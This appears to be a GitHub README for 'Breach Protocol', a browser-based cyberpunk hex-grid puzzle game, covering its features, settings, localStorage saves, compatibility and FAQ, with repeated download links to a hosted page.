# Breach Protocol v2026 - Game Script Utility 2026

> A browser-run cyberpunk puzzle utility for Breach Protocol, built around hex-matrix intrusion, buffer route planning, and quick play sessions directly in the web browser.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryannjbedwards2968/breach-protocol-script-utility?style=flat-square)](https://github.com/ryannjbedwards2968/breach-protocol-script-utility)

---

<p align="center">
  <a href="https://ryannjbedwards2968.github.io/breach-protocol-script-utility/">
    <img src="https://img.shields.io/badge/Download-Breach%20Protocol%20Script-brightgreen?style=for-the-badge" alt="Download Breach Protocol Script">
  </a>
</p>

> **[Direct Download - Breach Protocol](https://ryannjbedwards2968.github.io/breach-protocol-script-utility/)**

---

[Download Latest Build](https://ryannjbedwards2968.github.io/breach-protocol-script-utility/)

---

## What it is

Breach Protocol is a single-file HTML5 browser game centered on cyberpunk-style hacking sequences, hex-grid movement, and replayable short-form runs. The core loop is about mapping a buffer path through alternating row and column selections while adapting to countdowns, clues, and different play modes.

This build is meant for browser use and stores all progress in localStorage. As a result, achievements, journal records, upgrades, and the current session state stay in the browser unless you clear site data or move to another device.

## Included Features

- Hex-matrix breach gameplay with a cyberpunk presentation
- Alternating row-column buffer planning for route selection
- Multiple difficulty tiers and gameplay modes
- Hints and timers for paced puzzle sessions
- Cyberware shop with upgrade progression
- Achievements and journal tracking
- Local save persistence through localStorage
- Web Audio effects and CRT-style visual treatment

## Installation and Use

1. Open the single HTML file in a modern web browser.
2. If you are hosting it yourself, place the file in a static web folder and open it through your preferred local or remote server.
3. For best consistency, keep the file and its related assets together if you split the project into multiple files.

Basic use example:

1. Launch the page in your browser.
2. Start a breach run.
3. Follow the row-and-column pattern shown by the board.
4. Spend progress on upgrades and continue through the available modes.

## Settings

Typical in-game settings and toggles may include:

| Setting | Purpose |
| --- | --- |
| Difficulty tier | Adjusts challenge intensity |
| Game mode | Switches between available play styles |
| Hints | Controls guidance during runs |
| Timer | Enables or disables timed play |
| Audio effects | Toggles browser sound feedback |
| Visual style | Keeps the CRT-inspired presentation active |
| Save data | Uses localStorage for persistent progress |

Example configuration pattern:

- Difficulty: Normal
- Hints: On
- Timer: On
- Audio: On
- Progress storage: localStorage

## Browser Compatibility

Breach Protocol targets modern web browsers and relies on HTML5 capabilities. It is designed for desktop and browser setups that support localStorage and Web Audio.

Known limits:

- Progress is stored in the browser only
- Clearing site data removes saved runs and unlocks
- Behavior may vary slightly across browsers with different audio or storage policies

## FAQ

### How do I run it?
Open the HTML file in a supported browser. No separate installer is required for the single-file build.

### How do I keep my progress?
Progress is stored in localStorage, so use the same browser profile if you want to keep your saves and unlocks.

### Can I change the difficulty later?
Yes. The game includes multiple difficulty tiers and modes, so you can adjust the experience between sessions.

### Does it need an internet connection?
Not for local play once the file is available in your browser environment, though your setup may vary if you are using hosted assets.

### Can I customize the game?
Yes, if you are hosting or editing the file yourself. The project is a single-file static web app, which makes local adjustments straightforward for users who are comfortable working with HTML.

### Why did my saves disappear?
Stored progress depends on browser data. If site storage is cleared, or if you switch browsers or profiles, the saved state will not carry over.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
